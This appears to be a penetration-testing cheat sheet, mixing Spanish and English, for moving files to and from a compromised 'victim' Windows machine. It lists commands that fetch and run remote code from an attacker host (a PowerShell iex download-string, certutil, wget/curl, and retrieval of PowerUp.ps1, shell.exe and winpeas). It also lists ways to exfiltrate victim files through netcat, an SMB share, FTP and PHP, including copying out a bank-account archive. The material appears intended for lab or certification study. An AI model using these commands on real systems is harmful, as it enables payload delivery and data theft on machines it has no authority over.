
### TO THE VICTIM

*  **WGET (suele estar instalado en las ultimas versiones de Powershell): para descargar de una web. Si da problemas de certificado aadir --no-check-certificate:

```
wget <URL> --no-check-certificate 
```

* Curl:

```
curl -o <filename> http://<server>
```

* Certutil.exe

```
certutil.exe -urlcache -f http://<IP ADDRRESS>/<file name> <file name>
```

* Powershell

```
iex(new-object net.webclient).downloadstring('http://<IP>/<filename>')

iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

#Descargar un fichero (por ejem un .exe)
Invoke-WebRequest http://10.10.14.8/shell.exe -o shell.exe
```

* WinRM

```
upload /home/kali/tools/winpeas.exe C:\\users\\tadi\\winpeas.exe
```

* SMB Server  (se puede usar tambien para enviar ficheros a la Kali desde la máquina víctima)
	
	On Kali machine:
	
	```
	impacket-smbserver smb .
	# Con usuario y pass
	impacket-smbserver -username <<USERNAME>> -password <<PASSWORD>> smb .
	```

	**¡¡NOTA IMPORTANTE!!** --> -   use `-smb2support` if machine is running smb version 2

	On Windows machine: 
	
	```
	net use \\<KALI IP>\smb
	# Con usuario y pass
	net use \\<KALI IP>\smb /u:<<USERNAME>> <<PASSWORD>>
	
	copy C:\bank-account.zip Z:\bank-account.zip
	```


### FROM THE VICTIM

* **Netcat

	Maquina víctima:

	```
	nc <<IP>> <<PORT>> < <<FILE>>
	```

	Maquina atacante:

	```
	nc -lvnp <<PORT>> > <<NAME_FILE>> 
	```

* **FTP Server

	1. Host ftp server on your kali machine:
	```
	python3 -m pyftpdlib -p 21 --write
	```
	2. Now using ftp on the compromised windows machine connect to your ftp server using anonymous access:
```
	ftp <<IP>>
```

**¡¡NOTA IMPORTANTE!!** --> Remember to use `binary` mode when transferring files.

* **PHP

	If php is installed on the windows client, host a server and connect to it from your kali machine:
	```
	php -S 0.0.0.0:<IP>
	```



`
